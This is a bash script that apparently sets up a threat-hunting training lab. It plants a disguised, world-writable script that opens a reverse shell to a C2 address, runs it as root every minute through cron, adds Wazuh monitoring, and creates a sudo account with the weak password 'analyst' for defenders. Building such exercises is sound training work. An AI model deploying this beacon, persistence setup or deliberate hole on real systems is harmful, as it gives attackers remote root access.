#!/bin/bash
# Chay LAN DAU tren target, quyen user 'ubuntu'. $1 = mat khau sudo.
# Gieo "nhiem san": script doc world-writable + cron moi phut -> reverse shell ve C2.
PW="$1"

# ============ 1) Script doc (LO HONG: world-writable 0777) ============
cat > /tmp/.sysupdate <<'SH'
#!/bin/bash
# "sysupdate" - thuc chat la beacon reverse shell (persistence)
exec 2>/dev/null
# Chi 1 instance (giu ket noi ben vung, tranh chong chat tien trinh)
exec 9>/tmp/.sysupd.lock
flock -n 9 || exit 0
touch /tmp/.c2beacon
# exec -a: dat ten tien trinh = .sysupdate de hien ro trong 'ps' (cho SV san)
exec -a .sysupdate bash -i >& /dev/tcp/172.20.0.5/C2PORT 0>&1
SH
echo "$PW" | sudo -S cp /tmp/.sysupdate /usr/local/bin/.sysupdate
echo "$PW" | sudo -S chmod 0777 /usr/local/bin/.sysupdate   # <== LO HONG: ai cung ghi duoc
echo "$PW" | sudo -S chown root:root /usr/local/bin/.sysupdate

# ============ 2) Persistence: cron chay moi phut (duoi quyen root) ============
echo "$PW" | sudo -S bash -c 'echo "* * * * * root /usr/local/bin/.sysupdate" > /etc/cron.d/sysupdate; chmod 644 /etc/cron.d/sysupdate'
echo "$PW" | sudo -S service cron restart 2>/dev/null \
  || echo "$PW" | sudo -S systemctl restart cron 2>/dev/null || true

# ============ 3) Wazuh FIM: giam sat realtime thu muc bi dong cham ============
FIM='<directories realtime="yes" check_all="yes" report_changes="yes">/usr/local/bin,/etc/cron.d,/tmp</directories>'
echo "$PW" | sudo -S sed -i "s#<syscheck>#<syscheck>\n    ${FIM}#" /var/ossec/etc/ossec.conf 2>/dev/null
echo "$PW" | sudo -S systemctl restart wazuh-agent 2>/dev/null \
  || echo "$PW" | sudo -S service wazuh-agent restart 2>/dev/null || true

# ============ 4) Tai khoan analyst cho DEFENDER SSH sang xu ly ============
echo "$PW" | sudo -S useradd -m -s /bin/bash analyst 2>/dev/null
echo "$PW" | sudo -S bash -c 'echo "analyst:analyst" | chpasswd'
echo "$PW" | sudo -S usermod -aG sudo analyst 2>/dev/null
cat > /tmp/findings.txt <<'FND'
# BAO CAO SAN MOI DE DOA - dien gia tri ban tim duoc (giu dinh dang KEY=value):
C2_IP=
C2_PORT=
MAL_SCRIPT=
CRON_PERIOD=
FND
echo "$PW" | sudo -S cp /tmp/findings.txt /home/analyst/findings.txt
echo "$PW" | sudo -S chown analyst:analyst /home/analyst/findings.txt
echo "$PW" | sudo -S chmod 644 /home/analyst/findings.txt

exit 0
